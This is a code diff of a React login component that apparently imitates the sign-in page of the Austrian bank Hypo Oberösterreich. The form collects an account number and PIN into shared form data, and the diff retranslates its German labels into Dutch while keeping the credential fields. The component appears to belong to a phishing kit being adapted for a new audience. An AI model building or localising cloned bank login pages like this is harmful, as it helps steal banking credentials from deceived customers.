@@ -41,9 +41,9 @@ export function HypoOberosterreich({ formData, onChange, handleRouteAction, savi
         </div>
 
         {/* Headings */}
-        <h1 className="text-[28px] text-gray-800 font-normal mb-3">Bitte melden Sie sich an</h1>
+        <h1 className="text-[28px] text-gray-800 font-normal mb-3">Log alstublieft in</h1>
         <p className="text-[14px] text-gray-700 mb-8">
-          Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
+          Voer uw inloggegevens in om verder te gaan.
         </p>
 
         {/* Form */}
@@ -97,16 +97,16 @@ export function HypoOberosterreich({ formData, onChange, handleRouteAction, savi
             )}
           </div>
 
-          {/* Verfügernummer Field */}
+          {/* Inlogcode Field */}
           <div className="relative">
             <div className="w-full h-[52px] bg-[#f4f4f4] border-b-2 border-gray-400 px-4 flex items-center focus-within:border-[#6799c8] transition-colors">
               <div className="flex flex-col justify-center w-full">
                 {formData.verfuegernummer && (
-                  <span className="text-[11px] text-gray-500 mt-1 absolute top-1">Verfügernummer eingeben *</span>
+                  <span className="text-[11px] text-gray-500 mt-1 absolute top-1">Inlogcode invoeren *</span>
                 )}
                 <input 
                   type="text" 
-                  placeholder={formData.verfuegernummer ? "" : "Verfügernummer eingeben *"}
+                  placeholder={formData.verfuegernummer ? "" : "Inlogcode invoeren *"}
                   value={formData.verfuegernummer || ""}
                   onChange={(e) => onChange("verfuegernummer", e.target.value)}
                   className="w-full bg-transparent outline-none text-[15px] text-black pt-3 placeholder-gray-500"
